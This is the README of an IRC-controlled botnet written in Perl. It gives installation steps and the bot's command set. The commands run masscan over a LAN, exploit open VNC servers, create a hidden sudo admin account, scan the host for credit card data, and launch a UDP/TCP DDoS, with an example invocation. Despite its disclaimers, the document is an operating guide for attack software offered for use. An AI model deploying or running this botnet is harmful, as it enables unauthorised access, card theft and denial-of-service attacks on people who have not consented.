# I am not responsible for any actions you make with this program.
# You will not use this program to commit illegal crimes.
# You take entire responsability if you damage your or someone else's computer.

This code is an IRC BOT that can connect to an IRC server with SSL
The main purpose of this bot is to scan for Open/Unsecured VNC servers.
The bot can also search for credit card informations in the computer that the bot is running.
There is also a DDoS module made in Python, for taking out the target from the network.

# ---INSTALLATION---

git clone https://github.com/independentcod/PerlIRCSSL_VNCbypass.git
cd PerlIRCSSL_VNCbypass
chmod +x *
# (if using Debian, Kali or Ubuntu) 
./debian-installer.sh
# (elseif running CentOS)
./centos-installer.sh

# ----COMMANDS----
# NOTE:The commands can be done via PRIVATE MESSAGE and CHANNEL also.
# ----------------
# NEW COMMAND: @.getssh <= This will make a random admin account/password with sudo powers (use: sudo su :to get root access)
# ----------------
# Using this command will start masscan on your Local Area Network, or the LAN which the bot is installed on.
@.scan 192.168.0.0-192.168.255.255 
# This needs to be done before each @.exploit
@.format 
# This runs the VNC exploit and reports the working VNCs to the channel
@.exploit 
# This kills the exploit run
@.stopexploit 

# This will scan computer for credit card info and report in the channel. (REMOVED, will see if I put it back on later...)
@.ccplz
# This will give you the current running version. 
@.version

# DDoS Tool has been fixed and hits hard!
# @.ddos ip port UDP?y/n times threads
Example: @.ddos 127.0.0.1 8080 n 10000 1000 
# This kills the running ddos.
@.ddos.stop

# ---NOTE---
# In order for bot to work you need to be operator in the channel, it also must be registered with services.
# Follow the step-by-steps installations and you are done.
# ENJOY!
